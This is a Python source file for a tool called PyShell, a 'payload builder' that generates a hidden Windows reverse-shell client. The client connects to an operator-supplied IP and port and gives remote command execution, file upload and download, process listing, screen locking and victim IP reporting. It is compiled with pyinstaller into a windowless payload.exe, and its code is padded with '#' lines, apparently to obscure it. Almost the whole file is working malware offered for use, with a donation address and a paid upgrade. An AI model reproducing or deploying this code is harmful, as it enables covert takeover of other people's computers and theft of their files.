import os
import time
global homescreen

def setup():
    global ip
    global port
    ip = "not defined"
    port = "not defined"
    homescreen = f"""
 ██▓███ ▓██   ██▓  ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓██░  ██▒▒██  ██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▓██░ ██▓▒ ▒██ ██░░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒██▄█▓▒ ▒ ░ ▐██▓░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
▒██▒ ░  ░ ░ ██▒▓░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
▒▓▒░ 0  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
░▒ ░     ▓██ ░▒░ ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ 1  ░░ ░ ▒  ░░ ░ ▒  1
░░       ▒ ▒ ░░ 1░  ░  1   ░  ░░ 0   ░0    ░ ░  0  ░ ░   
0      1 ░ ░           ░   1  ░  ░   ░  1    ░  ░    ░  ░
         ░ 1         0          0            0             
┌───────────────────────[v1.0(FREE)]───────────────────────────┐
│[CREATED BY]: Jxmesx10                                        │
│[DONATE BTC]: 3MoGhf8NoEF5KmPRacsFxWeSFWG9mvJFmz              │
│[BUY UPDATE]: Refer to 'purchase.txt'                         │
├─────────────────────[Legal Disclaimer]───────────────────────┤ 
│ Usage of PyShell for attacking targets without prior         │
│ mutual consent is illegal.It's the end user's responsibility │
│ to obey all applicable local, state and federal laws.        │ 
│ Developers assume no liability and are not responsible for   │
│ any misuse or damage caused by this program.                 │
└──────────────────────────────────────────────────────────────┘


┌[PAYLOAD BUILDER 1.0(FREE)]┐
├[CONFIG]───────────────────┘
├── IP     : {ip}                                       
├── PORT   : {port}                           
└── VERSION: FREE    
"""
    os.system("cls")
    print(homescreen)
    ip = input("Enter IP Address: ")
    port = int(input("Enter Port Number: "))
    homescreen = f"""
 ██▓███ ▓██   ██▓  ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓██░  ██▒▒██  ██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▓██░ ██▓▒ ▒██ ██░░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒██▄█▓▒ ▒ ░ ▐██▓░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
▒██▒ ░  ░ ░ ██▒▓░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
▒▓▒░ 0  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
░▒ ░     ▓██ ░▒░ ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ 1  ░░ ░ ▒  ░░ ░ ▒  1
░░       ▒ ▒ ░░ 1░  ░  1   ░  ░░ 0   ░0    ░ ░  0  ░ ░   
0      1 ░ ░           ░   1  ░  ░   ░  1    ░  ░    ░  ░
         ░ 1         0          0            0             
┌───────────────────────[v1.0(FREE)]───────────────────────────┐
│[CREATED BY]: Jxmesx10                                        │
│[DONATE BTC]: 3MoGhf8NoEF5KmPRacsFxWeSFWG9mvJFmz              │
│[BUY UPDATE]: Refer to 'purchase.txt'                         │
├─────────────────────[Legal Disclaimer]───────────────────────┤ 
│ Usage of PyShell for attacking targets without prior         │
│ mutual consent is illegal.It's the end user's responsibility │
│ to obey all applicable local, state and federal laws.        │ 
│ Developers assume no liability and are not responsible for   │
│ any misuse or damage caused by this program.                 │
└──────────────────────────────────────────────────────────────┘


┌[PAYLOAD BUILDER 1.0(FREE)]┐
├[CONFIG]───────────────────┘
│
├── IP     : {ip}                                       
├── PORT   : {port}                           
├── VERSION: FREE
│
├[BUILDER]
│
└── PRESS ENTER TO BUILD ... """
    os.system("cls")
    print(homescreen, end="")
    wait = input()
    build()


def build():
    client = (f'''
import socket
import os
import subprocess
import pyautogui
from requests import get
###############################################################
#1#####################################################################
target_host = "{ip}"############################################################
target_port = {port}#################################################################
#2######################################################################
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
###################################################################################
client.connect((target_host,target_port))
''')
    client = client + (r'''
###########################################################################################
#3##############################################################################################################
while True:###############################################################################
    try:
        executed = False
        data = client.recv(16777216)########################################################################################
        try:
            command = data.decode("utf-8")
        except UnicodeDecodeError:
            file = data###################################################################################
            client.send(str.encode("y"))
            data = client.recv(2048)############################################################################
            fname = data.decode("utf-8")
            f = open(fname, "wb")
            f.write(file)
            f.close()####################################################################################
            executed = True
            command = "sent"
#############################################################################################
        if command == "sent":
            client.send(str.encode("[*] Successfully uploaded "+ fname + "\n"+str(os.getcwd()) + "> "))
            executed = True##########################################################################

        if command[:2] == "cd":
            os.chdir(command[3:])
            client.send(str.encode(str(os.getcwd()) + "> "))#######################################################
            executed = True

        if command == "tasks":
            cmd = subprocess.Popen("tasklist", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
            output_bytes = cmd.stdout.read()########################################################################
            output_str = str(output_bytes, "utf-8")
            client.send(str.encode(output_str + "\n" + str(os.getcwd()) + "> "))
            executed = True

        if command[:3] == "msg":
            text = command.replace("msg","")
            pyautogui.alert(text, timeout=30000)
            client.send(str.encode("[*] Message sent successfully!\n" + str(os.getcwd()) + "> "))
            executed = True

        if command == "lock":
            os.system("rundll32.exe user32.dll, LockWorkStation")
            client.send(str.encode("[*] Locked victims screen \n" + str(os.getcwd()) + "> "))
            executed = True

        if command == "ip":
            ip = get('https://api.ipify.org').text
            client.send(str.encode("[*] Victims ip: " + ip + "\n"+ str(os.getcwd()) + "> "))
            executed = True

        if command == "terminate":
            client.close()
            exit()

        if command[:8] == "download":
            fname = command.replace("download ","")
            f = open(fname, "rb")
            file = f.read()
            client.send(file)
            executed = True

        if executed == False:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
            output_bytes = cmd.stdout.read()
            output_str = str(output_bytes, "utf-8")
            client.send(str.encode(output_str + str(os.getcwd()) + "> "))
            #print(output_str)

    except Exception as e:
        error = str(e)
        client.send(str.encode("[!] Client error: "+error))


client.close()
    ''')
    try:
        f = open("pyinstaller.exe","rb")
        f.close()
        os.system("")
    except FileNotFoundError:
        print("[!] Cannot find 'pyinstaller.exe' move it to this directory:\n"+str(os.getcwd())+ "...")
        wait = input()
        exit()

    try:
        f = open("payload.py","w")
        f.write(client)
        f.close()
    except Exception as e:
        print("[!] Failed to write client file: " + str(e) + "...")
        wait = input()
        exit()

    try:
        os.system("pyinstaller.exe -w --onefile payload.py")
        wait = input("\n\n[*] Successfully created payload.exe\n[*] Payload saved in 'dist' folder \n[*] Press enter to quit ...")
        os.unlink("payload.py")
        exit()


    except Exception as e:
        print("[!] Failed to build: "+str(e) + "...")
        exit()
